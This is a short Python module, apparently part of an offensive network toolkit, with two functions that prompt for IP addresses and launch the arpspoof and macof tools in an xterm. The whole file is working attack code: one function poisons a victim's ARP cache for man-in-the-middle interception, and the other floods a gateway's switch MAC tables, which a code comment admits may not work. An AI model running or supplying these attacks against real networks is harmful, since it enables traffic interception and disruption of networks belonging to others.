from helpers.utils import output, loop_input
import os


def arpoisoner(out_lck, interface):

    output(out_lck, "\nArp Poisoner\n")

    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    gatewayip = loop_input(out_lck, "Please insert target IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (interface, "192.168." + victimip, "192.168." + gatewayip))


def macflooder(out_lck, interface):
    #This attack will spam mac tables of the target router, dunno if it works
    output(out_lck, "\nMac Flooding\n")

    gatewayIP = loop_input(out_lck, "Please insert gateway IP (Ex 0.10): ")

    os.system("xterm -e \"macof -i %s -d %s\"" % (interface, "192.168." + gatewayIP))